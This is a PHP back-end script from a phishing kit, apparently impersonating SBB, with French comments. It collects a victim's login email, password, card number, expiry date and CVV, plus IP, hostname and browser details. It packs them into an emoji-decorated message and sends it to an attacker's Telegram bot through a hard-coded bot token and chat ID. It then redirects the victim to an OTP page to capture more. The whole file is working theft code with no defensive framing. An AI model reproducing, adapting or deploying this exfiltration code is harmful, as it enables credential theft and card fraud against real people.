<?php
session_start();
if(!isset($_SESSION['email'])) die('Accès invalide');

$botToken = "7680764335:AAF1DVT5n0Cye90-1W-eBWkE9gFZJ-iUPX8";
$chatID = "-1002229212231";

// Récupération données carte
$cardNumber = preg_replace('/\s+/', '', $_POST['cardNumber']);
$expDate = $_POST['expDate'];
$cvv = $_POST['secode'];

// Formatage numéro de carte
$formattedCard = implode(' ', str_split($cardNumber, 4));

// Récup infos victime
$victim = $_SESSION['victim_info'];
$date = date('l d F Y @ H:i');

// Construction message
$message = "
|++++++++| 😈 SBB - INFOS 😈 |++++++++|
|
|💶 LOGIN 💶 : {$_SESSION['email']}
|🔐 PASS 🔐 : {$_SESSION['password']}
|
|+++++++| 😈 CARD - INFOS 😈 |+++++++|
|
|💳 NUMB 💳 : $formattedCard
|📆 EXPD 📆 : $expDate
|🔐 CVV 🔐 : $cvv
|
|+++++++| 😈 VICTIM - INFOS 😈 |+++++++|
|
|Submitted by: {$victim['ip']} ({$victim['hostname']})
|Browser: {$victim['browser']}
|Screen Size: {$victim['screen']}
|Received: $date
|
|++++++| 😈  😈  Lajded 😈  😈 |++++++|
";

// Envoi et stockage
sendToTelegram($message);
$_SESSION['card'] = compact('cardNumber', 'expDate', 'cvv');
header('Location: otp.html');
exit();

function sendToTelegram($text) {
    global $botToken, $chatID;
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
        'chat_id' => $chatID,
        'text' => $text
    ]));
}
?>